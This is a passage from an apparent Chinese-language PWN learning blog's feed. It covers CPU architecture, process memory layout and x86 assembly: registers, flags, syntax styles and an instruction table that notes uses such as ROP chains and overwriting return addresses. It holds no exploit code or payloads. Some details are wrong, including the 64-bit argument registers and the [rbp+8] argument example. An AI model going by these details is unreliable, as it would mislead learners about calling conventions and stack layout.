    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="Stack Canaries" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/Stack-Canaries/"/>
    
    
  </entry>
  
  <entry>
    <title>CPU架构与进程的执行</title>
    <link href="https://rhea006.github.io/2025/06/a3f22c1b9650.html"/>
    <id>https://rhea006.github.io/2025/06/a3f22c1b9650.html</id>
    <published>2025-06-30T12:16:36.000Z</published>
    <updated>2025-06-30T06:09:29.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CPU-与指令集基础概念"><a href="#CPU-与指令集基础概念" class="headerlink" title="CPU 与指令集基础概念"></a>CPU 与指令集基础概念</h1><h2 id="CPU-的核心组件"><a href="#CPU-的核心组件" class="headerlink" title="CPU 的核心组件"></a>CPU 的核心组件</h2><ul><li>算术逻辑单元（ALU）：执行算术和逻辑运算（如加法、比较）。</li><li>控制单元（CU）：解析指令并协调 CPU 各组件工作。</li><li>寄存器（Registers）：CPU 内部的高速存储单元，用于暂存数据和指令。</li><li>总线（Bus）：连接 CPU 与内存、IO 设备的数据通道。</li></ul><h2 id="指令集（Instruction-Set-Architecture-ISA）"><a href="#指令集（Instruction-Set-Architecture-ISA）" class="headerlink" title="指令集（Instruction Set Architecture, ISA）"></a>指令集（Instruction Set Architecture, ISA）</h2><ul><li><p>定义：CPU 支持的指令集合，规定了 CPU 能执行的基本操作。</p></li><li><p>分类：</p><ul><li>复杂指令集（CISC）：如 x86，指令长度可变，支持复杂操作（如内存直接操作）。</li><li>精简指令集（RISC）：如 ARM，指令长度固定，强调简单指令的高效执行。</li><li>超长指令字（VLIW）：如 TI DSP，并行执行多条指令。</li></ul></li></ul><h2 id="汇编语言与指令集的关系"><a href="#汇编语言与指令集的关系" class="headerlink" title="汇编语言与指令集的关系"></a>汇编语言与指令集的关系</h2><ul><li>汇编指令是机器指令的助记符，与指令集一一对应。</li><li>不同 CPU 架构（如 x86、ARM）的汇编语言差异显著，不可通用。</li></ul><p><img src="/../../../../../images/image-20250629233840943.png" alt="image-20250629233840943"></p><h1 id="进程的执行"><a href="#进程的执行" class="headerlink" title="进程的执行"></a>进程的执行</h1><p><img src="/../../../../../images/image-20250629234753250.png" alt="image-20250629234753250"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> glb;     <span class="comment">//未赋值的全局整型变量对应Bss</span></span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t = x + y; <span class="comment">//局部变量对应Stack</span></span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">void</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//局部变量对应Stack</span></span><br><span class="line">    read(<span class="number">0</span>, ptr, <span class="number">0x100</span>); <span class="comment">// input &quot;deadbeef&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../../images/image-20250630130607400.png" alt="image-20250630130607400"></p><p><img src="/../../../../../images/image-20250630135559594.png" alt="image-20250630135559594"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CPU-与指令集基础概念&quot;&gt;&lt;a href=&quot;#CPU-与指令集基础概念&quot; class=&quot;headerlink&quot; title=&quot;CPU 与指令集基础概念&quot;&gt;&lt;/a&gt;CPU 与指令集基础概念&lt;/h1&gt;&lt;h2 id=&quot;CPU-的核心组件&quot;&gt;&lt;a href=&quot;#CPU-</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="汇编基础" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    
    <category term="CPU架构与指令集" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/CPU%E6%9E%B6%E6%9E%84%E4%B8%8E%E6%8C%87%E4%BB%A4%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>装载与汇编</title>
    <link href="https://rhea006.github.io/2025/06/fc710085a15b.html"/>
    <id>https://rhea006.github.io/2025/06/fc710085a15b.html</id>
    <published>2025-06-30T12:16:36.000Z</published>
    <updated>2025-06-30T08:47:45.570Z</updated>
    
    <content type="html"><![CDATA[<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><p><img src="/../../../../../images/image-20250630141153683.png" alt="image-20250630141153683"></p><p><img src="/../../../../../images/image-20250630140857482.png" alt="image-20250630140857482"></p><p><img src="/../../../../../images/image-20250630141427878.png" alt="image-20250630141427878"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="两种语法风格"><a href="#两种语法风格" class="headerlink" title="两种语法风格"></a>两种语法风格</h2><table><thead><tr><th>功能 &#x2F; 场景</th><th>Intel 汇编格式</th><th>AT&amp;T 汇编格式</th></tr></thead><tbody><tr><td><strong>立即数传送到寄存器</strong></td><td><code>mov eax, 8</code></td><td><code>movl $8, %eax</code></td></tr><tr><td><strong>带十六进制立即数的传送</strong></td><td><code>mov ebx, 0ffffh</code></td><td><code>movl $0xffff, %ebx</code></td></tr><tr><td><strong>触发系统调用（中断）</strong></td><td><code>int 80h</code></td><td><code>int $0x80</code></td></tr><tr><td><strong>内存数据传送到寄存器</strong></td><td><code>mov eax, [ecx]</code></td><td><code>movl (%ecx), %eax</code></td></tr><tr><td><strong>函数 &#x2F; 过程（sum 示例）</strong></td><td>sum:<br/>push ebp<br/>mov ebp, esp<br/>mov eax, [ebp+12]<br/>add eax, [ebp+8]<br/>pop ebp<br/>retn<br/></td><td>sum:<br/>pushl %ebp<br/>movl %esp, %ebp<br/>movl 12(%ebp), %eax<br/>addl 8(%ebp), %eax<br/>popl %ebp<br/>ret<br/></td></tr></tbody></table><h2 id="寄存器与数据类型"><a href="#寄存器与数据类型" class="headerlink" title="寄存器与数据类型"></a>寄存器与数据类型</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table><thead><tr><th align="left"><strong>寄存器</strong></th><th align="left"><strong>位数</strong></th><th align="left"><strong>主要功能</strong></th><th align="left"><strong>特殊用途</strong></th><th align="left"><strong>子寄存器关系</strong></th></tr></thead><tbody><tr><td align="left"><strong>RAX</strong></td><td align="left">64-bit</td><td align="left">函数返回值、算术运算</td><td align="left">系统调用号(Syscall)</td><td align="left">RAX → EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>EAX</strong></td><td align="left">32-bit</td><td align="left">累加器、算术运算主存器</td><td align="left">乘法&#x2F;除法结果存储</td><td align="left">EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>AX</strong></td><td align="left">16-bit</td><td align="left">字乘法&#x2F;字除法&#x2F;字I&#x2F;O</td><td align="left">-</td><td align="left">AX → AH(高8位)&#x2F;AL(低8位)</td></tr><tr><td align="left"><strong>AL</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法&#x2F;字节I&#x2F;O 十进制运算</td><td align="left">BCD运算</td><td align="left">AX的低字节</td></tr><tr><td align="left"><strong>AH</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法</td><td align="left">-</td><td align="left">AX的高字节</td></tr><tr><td align="left"><strong>RBX</strong></td><td align="left">64-bit</td><td align="left">通用数据存储</td><td align="left">内存寻址基址</td><td align="left">RBX → EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>EBX</strong></td><td align="left">32-bit</td><td align="left">内存寻址基址</td><td align="left">-</td><td align="left">EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>BX</strong></td><td align="left">16-bit</td><td align="left">内存指针</td><td align="left">段寄存器(DS)的默认基址</td><td align="left">BX → BH(高8位)&#x2F;BL(低8位)</td></tr><tr><td align="left"><strong>RCX</strong></td><td align="left">64-bit</td><td align="left">循环计数器</td><td align="left">REP前缀指令计数</td><td align="left">RCX → ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>ECX</strong></td><td align="left">32-bit</td><td align="left">循环计数器</td><td align="left">-</td><td align="left">ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>CX</strong></td><td align="left">16-bit</td><td align="left">串操作&#x2F;循环控制</td><td align="left">-</td><td align="left">CX → CH(高8位)&#x2F;CL(低8位)</td></tr><tr><td align="left"><strong>CL</strong></td><td align="left">8-bit</td><td align="left">移位&#x2F;旋转计数器</td><td align="left">位操作指令</td><td align="left">CX的低字节</td></tr><tr><td align="left"><strong>RDX</strong></td><td align="left">64-bit</td><td align="left">I&#x2F;O指针、数据存储</td><td align="left">除法余数存储</td><td align="left">RDX → EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>EDX</strong></td><td align="left">32-bit</td><td align="left">字乘法&#x2F;字除法 间接I&#x2F;O</td><td align="left">除法余数</td><td align="left">EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>DX</strong></td><td align="left">16-bit</td><td align="left">端口地址指针</td><td align="left">-</td><td align="left">DX → DH(高8位)&#x2F;DL(低8位)</td></tr><tr><td align="left"><strong>RSI</strong></td><td align="left">64-bit</td><td align="left">内存源指针</td><td align="left">串操作源地址</td><td align="left">RSI → ESI → SI</td></tr><tr><td align="left"><strong>ESI</strong></td><td align="left">32-bit</td><td align="left">内存源指针</td><td align="left">LODS&#x2F;MOVS等指令</td><td align="left">ESI → SI</td></tr><tr><td align="left"><strong>SI</strong></td><td align="left">16-bit</td><td align="left">串操作源指针</td><td align="left">DS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RDI</strong></td><td align="left">64-bit</td><td align="left">内存目的指针</td><td align="left">串操作目的地址</td><td align="left">RDI → EDI → DI</td></tr><tr><td align="left"><strong>EDI</strong></td><td align="left">32-bit</td><td align="left">内存目的指针</td><td align="left">STOS&#x2F;MOVS等指令</td><td align="left">EDI → DI</td></tr><tr><td align="left"><strong>DI</strong></td><td align="left">16-bit</td><td align="left">串操作目的指针</td><td align="left">ES段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RBP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">访问栈帧参数&#x2F;局部变量</td><td align="left">RBP → EBP → BP</td></tr><tr><td align="left"><strong>EBP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">函数栈帧基准</td><td align="left">EBP → BP</td></tr><tr><td align="left"><strong>BP</strong></td><td align="left">16-bit</td><td align="left">栈数据访问指针</td><td align="left">SS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RSP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">当前栈顶位置</td><td align="left">RSP → ESP → SP</td></tr><tr><td align="left"><strong>ESP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">PUSH&#x2F;POP操作</td><td align="left">ESP → SP</td></tr><tr><td align="left"><strong>SP</strong></td><td align="left">16-bit</td><td align="left">栈顶指针</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><strong>RIP</strong></td><td align="left">64-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">存放下一条指令地址</td><td align="left">RIP → EIP → IP</td></tr><tr><td align="left"><strong>EIP</strong></td><td align="left">32-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">控制程序执行流程</td><td align="left">EIP → IP</td></tr><tr><td align="left"><strong>IP</strong></td><td align="left">16-bit</td><td align="left">指令指针</td><td align="left">实模式下使用</td><td align="left">-</td></tr></tbody></table><h4 id="关键补充说明："><a href="#关键补充说明：" class="headerlink" title="关键补充说明："></a>关键补充说明：</h4><h5 id="寄存器层级关系："><a href="#寄存器层级关系：" class="headerlink" title="寄存器层级关系："></a>寄存器层级关系：</h5><ul><li>64位寄存器 (R开头)：<code>RAX</code>, <code>RBX</code>, <code>RCX</code>, <code>RDX</code>, <code>RSI</code>, <code>RDI</code>, <code>RBP</code>, <code>RSP</code>, <code>RIP</code></li><li>32位寄存器 (E开头)：<code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code>, <code>ESI</code>, <code>EDI</code>, <code>EBP</code>, <code>ESP</code>, <code>EIP</code></li><li>16位寄存器：<code>AX</code>, <code>BX</code>, <code>CX</code>, <code>DX</code>, <code>SI</code>, <code>DI</code>, <code>BP</code>, <code>SP</code>, <code>IP</code></li><li>8位寄存器：<code>AH</code>&#x2F;<code>AL</code>, <code>BH</code>&#x2F;<code>BL</code>, <code>CH</code>&#x2F;<code>CL</code>, <code>DH</code>&#x2F;<code>DL</code></li></ul><h5 id="Pwn-逆向中的核心寄存器："><a href="#Pwn-逆向中的核心寄存器：" class="headerlink" title="Pwn&#x2F;逆向中的核心寄存器："></a>Pwn&#x2F;逆向中的核心寄存器：</h5><ul><li><strong>RIP&#x2F;EIP</strong>：控制程序执行流（劫持核心目标）</li><li><strong>RSP&#x2F;ESP</strong>：栈指针（缓冲区溢出关键）</li><li><strong>RBP&#x2F;EBP</strong>：栈帧基准（定位局部变量&#x2F;参数）</li><li><strong>RAX&#x2F;EAX</strong>：存储系统调用号和函数返回值</li></ul><h5 id="特殊功能寄存器："><a href="#特殊功能寄存器：" class="headerlink" title="特殊功能寄存器："></a>特殊功能寄存器：</h5><ul><li><strong>段寄存器</strong>：CS（代码段）, DS（数据段）, SS（堆栈段）, ES&#x2F;FS&#x2F;GS（附加段）</li><li><strong>标志寄存器</strong>：EFLAGS&#x2F;RFLAGS（存储状态标志如ZF&#x2F;CF&#x2F;SF等）</li></ul><h5 id="寄存器使用场景："><a href="#寄存器使用场景：" class="headerlink" title="寄存器使用场景："></a>寄存器使用场景：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#函数调用示例</span><br><span class="line">push rbp            ; 保存调用者栈帧</span><br><span class="line">mov rbp, rsp        ; 建立新栈帧</span><br><span class="line">mov eax, [rbp+8]    ; 获取第一个参数</span><br><span class="line">add eax, [rbp+12]   ; 加上第二个参数</span><br><span class="line">pop rbp             ; 恢复栈帧</span><br><span class="line">ret                 ; 返回到RIP指向地址</span><br></pre></td></tr></table></figure><h5 id="64位与32位差异："><a href="#64位与32位差异：" class="headerlink" title="64位与32位差异："></a>64位与32位差异：</h5><ul><li>64位新增寄存器：R8-R15</li><li>调用约定变更：64位使用RCX&#x2F;RDX&#x2F;R8&#x2F;R9传参</li><li>内存寻址范围扩大：64位支持48位虚拟地址空间</li></ul><h5 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h5><p>一个栈帧就是保存一个函数的状态，简单来说就是一个函数所需要的栈空间.</p><p>rsp(栈顶寄存器) &#x2F;esp(栈指针寄存器)永远指向栈帧的栈顶，rbp(栈基寄存器)&#x2F;ebp(扩展基址指针寄存器)则永远指向栈帧的栈底,rip(程序计数寄存器)&#x2F;eip(指令指针寄存器)指向当前栈栈帧执行的命令。</p><p>栈从高地址向低地址开辟内存空间，所以低地址的是栈顶，而栈底的第一个栈帧在这里存放着我们的主函数的父函数，所以main函数并不是最栈顶的函数，main上面还会在编译过程中有一些库函数，但是他们并不会产生栈帧，因为栈先进后出的特性，所以当在main函数中需要调用其他函数时，就开辟一个新的函数栈帧，并存储上一个栈的栈底，当调用结束时，将现在的栈帧弹出，恢复到原来的main函数继续执行完main函数。</p><p><img src="/../../../../../images/image-20250630161338940.png" alt="image-20250630161338940"></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><h5 id="表达方式："><a href="#表达方式：" class="headerlink" title="表达方式："></a>表达方式：</h5><table><thead><tr><th align="left"><strong>进制</strong></th><th align="left"><strong>前缀</strong></th><th align="left"><strong>示例</strong></th><th align="left">汇编表示</th></tr></thead><tbody><tr><td align="left"><strong>十进制</strong></td><td align="left">无</td><td align="left"><code>12345</code></td><td align="left"><code>mov eax, 12345</code></td></tr><tr><td align="left"><strong>十六进制</strong></td><td align="left"><code>0x</code></td><td align="left"><code>0xDEADBEEF</code></td><td align="left"><code>mov ebx, 0xDEADBEEF</code></td></tr><tr><td align="left"><strong>八进制</strong></td><td align="left"><code>0</code></td><td align="left"><code>0755</code></td><td align="left"><code>mov ecx, 0755</code></td></tr><tr><td align="left"><strong>二进制</strong></td><td align="left"><code>0b</code></td><td align="left"><code>0b10101010</code></td><td align="left"><code>mov dl, 0b10101010</code></td></tr></tbody></table><h5 id="内存存储（小端序）："><a href="#内存存储（小端序）：" class="headerlink" title="内存存储（小端序）："></a>内存存储（小端序）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0x12345678</span>;  <span class="comment">// 32位整数</span></span><br><span class="line"><span class="comment">// 内存布局（地址递增）：</span></span><br><span class="line">Address: <span class="number">0x1000</span> → <span class="number">0x78</span></span><br><span class="line">Address: <span class="number">0x1001</span> → <span class="number">0x56</span></span><br><span class="line">Address: <span class="number">0x1002</span> → <span class="number">0x34</span></span><br><span class="line">Address: <span class="number">0x1003</span> → <span class="number">0x12</span></span><br></pre></td></tr></table></figure><h4 id="浮点数常量"><a href="#浮点数常量" class="headerlink" title="浮点数常量"></a>浮点数常量</h4><h5 id="IEEE-754标准："><a href="#IEEE-754标准：" class="headerlink" title="IEEE 754标准："></a>IEEE 754标准：</h5><table><thead><tr><th align="left"><strong>类型</strong></th><th align="left"><strong>总位数</strong></th><th align="left"><strong>符号位</strong></th><th align="left"><strong>指数位</strong></th><th align="left"><strong>尾数位</strong></th><th align="left"><strong>范围</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left"><strong>float</strong></td><td align="left">32-bit</td><td align="left">1 bit</td><td align="left">8 bits</td><td align="left">23 bits</td><td align="left">±3.4e38</td><td align="left"><code>3.14f</code></td></tr><tr><td align="left"><strong>double</strong></td><td align="left">64-bit</td><td align="left">1 bit</td><td align="left">11 bits</td><td align="left">52 bits</td><td align="left">±1.7e308</td><td align="left"><code>2.71828</code></td></tr></tbody></table><h5 id="内存布局（float示例）："><a href="#内存布局（float示例）：" class="headerlink" title="内存布局（float示例）："></a>内存布局（float示例）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14159</span>;  <span class="comment">// 十六进制: 0x40490FD0</span></span><br><span class="line"><span class="comment">// 内存结构（小端序）：</span></span><br><span class="line"><span class="number">0x0000</span>: D0  <span class="comment">// 尾数低位</span></span><br><span class="line"><span class="number">0x0001</span>: <span class="number">0F</span>  </span><br><span class="line"><span class="number">0x0002</span>: <span class="number">49</span>  <span class="comment">// 尾数高位 + 指数低位</span></span><br><span class="line"><span class="number">0x0003</span>: <span class="number">40</span>  <span class="comment">// 符号(0) + 指数高位</span></span><br></pre></td></tr></table></figure><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><h5 id="内存表示："><a href="#内存表示：" class="headerlink" title="内存表示："></a>内存表示：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello Pwn!&quot;</span>; </span><br><span class="line"><span class="comment">// 内存布局：</span></span><br><span class="line">Address: <span class="number">0x4000</span> → <span class="string">&#x27;H&#x27;</span> (<span class="number">0x48</span>)</span><br><span class="line">Address: <span class="number">0x4001</span> → <span class="string">&#x27;e&#x27;</span> (<span class="number">0x65</span>)</span><br><span class="line">...</span><br><span class="line">Address: <span class="number">0x4009</span> → <span class="string">&#x27;!&#x27;</span> (<span class="number">0x21</span>)</span><br><span class="line">Address: <span class="number">0x400A</span> → <span class="number">0x00</span>  <span class="comment">// NULL终止符</span></span><br></pre></td></tr></table></figure><h5 id="汇编定义："><a href="#汇编定义：" class="headerlink" title="汇编定义："></a>汇编定义：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &#x27;Hello Pwn!&#x27;, 0x0A, 0  ; 带换行符的字符串</span><br><span class="line">section .text</span><br><span class="line">    mov rsi, msg   ; 字符串地址 → RSI</span><br><span class="line">    mov rdx, 11    ; 长度(包括换行)</span><br><span class="line">    syscall        ; Linux写系统调用</span><br></pre></td></tr></table></figure><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>·进位标志CF(Carry Flag):</strong><br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高 位产生了一个进位或借位，那么，其值为1，否则其值为0。<br><strong>·奇偶标志PF(Parity Flag):</strong><br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br><strong>·辅助进位标志AF(Auxiliary Carry Flag)：</strong><br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0(在字操作时，发生低字节向高字节进位或借位时；在字节操作时，发生低4位向高4位进位或借位时)。<br><strong>·零标志ZF(ZeroFlag):</strong><br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br><strong>·符号标志SF(Sign Flag):</strong><br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br><strong>·溢出标志OF(Overflow Flag):</strong><br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 </p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="常用指令表"><a href="#常用指令表" class="headerlink" title="常用指令表"></a>常用指令表</h3><table><thead><tr><th align="left"><strong>指令类型</strong></th><th align="left"><strong>指令</strong></th><th align="left"><strong>语法</strong></th><th align="left"><strong>功能描述</strong></th><th align="left"><strong>标志位影响</strong></th><th align="left"><strong>Pwn应用场景</strong></th></tr></thead><tbody><tr><td align="left"><strong>数据传送</strong></td><td align="left"><code>MOV</code></td><td align="left"><code>MOV 目标, 源</code></td><td align="left">将源操作数复制到目标</td><td align="left"><strong>无影响</strong></td><td align="left">构造ROP链、寄存器控制</td></tr><tr><td align="left"></td><td align="left"><code>LEA</code></td><td align="left"><code>LEA 目标, [内存]</code></td><td align="left">加载有效地址（不访问内存）</td><td align="left"><strong>无影响</strong></td><td align="left">计算地址绕过ASLR</td></tr><tr><td align="left"><strong>算术运算</strong></td><td align="left"><code>ADD</code></td><td align="left"><code>ADD 目标, 源</code></td><td align="left">目标 &#x3D; 目标 + 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">整数溢出漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>SUB</code></td><td align="left"><code>SUB 目标, 源</code></td><td align="left">目标 &#x3D; 目标 - 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">内存地址计算</td></tr><tr><td align="left"></td><td align="left"><code>INC</code></td><td align="left"><code>INC 目标</code></td><td align="left">目标 &#x3D; 目标 + 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">计数器修改</td></tr><tr><td align="left"></td><td align="left"><code>DEC</code></td><td align="left"><code>DEC 目标</code></td><td align="left">目标 &#x3D; 目标 - 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">循环控制</td></tr><tr><td align="left"><strong>逻辑运算</strong></td><td align="left"><code>AND</code></td><td align="left"><code>AND 目标, 源</code></td><td align="left">目标 &#x3D; 目标 &amp; 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位掩码操作</td></tr><tr><td align="left"></td><td align="left"><code>OR</code></td><td align="left"><code>OR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 | 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位设置</td></tr><tr><td align="left"></td><td align="left"><code>XOR</code></td><td align="left"><code>XOR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 ^ 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">清零寄存器(<code>XOR EAX, EAX</code>)</td></tr><tr><td align="left"></td><td align="left"><code>NOT</code></td><td align="left"><code>NOT 目标</code></td><td align="left">目标 &#x3D; ~目标</td><td align="left"><strong>无影响</strong></td><td align="left">位翻转</td></tr><tr><td align="left"><strong>控制转移</strong></td><td align="left"><code>CALL</code></td><td align="left"><code>CALL 地址</code></td><td align="left">1. 压入返回地址 2. 跳转到目标地址</td><td align="left"><strong>无影响</strong></td><td align="left">函数调用劫持</td></tr><tr><td align="left"></td><td align="left"><code>RET</code></td><td align="left"><code>RET [n]</code></td><td align="left">1. 弹出返回地址 2. 跳转到该地址 3. 可选栈调整</td><td align="left"><strong>无影响</strong></td><td align="left">栈溢出利用</td></tr><tr><td align="left"></td><td align="left"><code>JMP</code></td><td align="left"><code>JMP 地址</code></td><td align="left">无条件跳转</td><td align="left"><strong>无影响</strong></td><td align="left">程序流劫持</td></tr><tr><td align="left"><strong>比较测试</strong></td><td align="left"><code>CMP</code></td><td align="left"><code>CMP 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 - 操作数2)</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">条件分支漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>TEST</code></td><td align="left"><code>TEST 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 &amp; 操作数2)</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">权限检查绕过</td></tr><tr><td align="left"><strong>栈操作</strong></td><td align="left"><code>PUSH</code></td><td align="left"><code>PUSH 源</code></td><td align="left">1. ESP -&#x3D; 4&#x2F;8 2. [ESP] &#x3D; 源</td><td align="left"><strong>无影响</strong></td><td align="left">栈帧构造</td></tr><tr><td align="left"></td><td align="left"><code>POP</code></td><td align="left"><code>POP 目标</code></td><td align="left">1. 目标 &#x3D; [ESP] 2. ESP +&#x3D; 4&#x2F;8</td><td align="left"><strong>无影响</strong></td><td align="left">ROP gadget利用</td></tr><tr><td align="left"><strong>系统调用</strong></td><td align="left"><code>INT</code></td><td align="left"><code>INT n</code></td><td align="left">触发软件中断</td><td align="left"><strong>影响所有</strong></td><td align="left">系统调用利用</td></tr><tr><td align="left"></td><td align="left"><code>SYSCALL</code></td><td align="left"><code>SYSCALL</code></td><td align="left">快速系统调用</td><td align="left"><strong>影响所有</strong></td><td align="left">现代漏洞利用</td></tr></tbody></table><h3 id="关键指令深度解析"><a href="#关键指令深度解析" class="headerlink" title="关键指令深度解析"></a>关键指令深度解析</h3><h4 id="MOV-vs-LEA"><a href="#MOV-vs-LEA" class="headerlink" title="MOV vs LEA"></a>MOV vs LEA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; MOV - 内存访问</span><br><span class="line">mov eax, [ebx]   ; 将ebx指向的内存内容加载到eax</span><br><span class="line"></span><br><span class="line">; LEA - 不访问内存</span><br><span class="line">lea eax, [ebx+8] ; 计算地址值ebx+8并存入eax（不读取内存）</span><br></pre></td></tr></table></figure><p><strong>Pwn应用</strong>：LEA常用于计算地址偏移，绕过ASLR</p><h4 id="CMP与条件跳转"><a href="#CMP与条件跳转" class="headerlink" title="CMP与条件跳转"></a>CMP与条件跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, 100     ; 比较eax和100</span><br><span class="line">jg  overflow     ; 若eax &gt; 100则跳转</span><br></pre></td></tr></table></figure><p><strong>标志位关系</strong>：</p><table><thead><tr><th align="left"><strong>跳转指令</strong></th><th align="left"><strong>含义</strong></th><th align="left"><strong>检查标志</strong></th></tr></thead><tbody><tr><td align="left"><code>JE/JZ</code></td><td align="left">相等&#x2F;零</td><td align="left">ZF&#x3D;1</td></tr><tr><td align="left"><code>JNE/JNZ</code></td><td align="left">不等&#x2F;非零</td><td align="left">ZF&#x3D;0</td></tr><tr><td align="left"><code>JG/JNLE</code></td><td align="left">大于</td><td align="left">ZF&#x3D;0且SF&#x3D;OF</td></tr><tr><td align="left"><code>JL/JNGE</code></td><td align="left">小于</td><td align="left">SF≠OF</td></tr></tbody></table><h4 id="CALL-RET-机制"><a href="#CALL-RET-机制" class="headerlink" title="CALL-RET 机制"></a>CALL-RET 机制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call func:   ; 相当于</span><br><span class="line">  push eip+5 ; 压入返回地址(下条指令)</span><br><span class="line">  jmp func</span><br><span class="line"></span><br><span class="line">ret:        ; 相当于</span><br><span class="line">  pop eip   ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong>：缓冲区溢出覆盖返回地址</p><h4 id="栈操作指令"><a href="#栈操作指令" 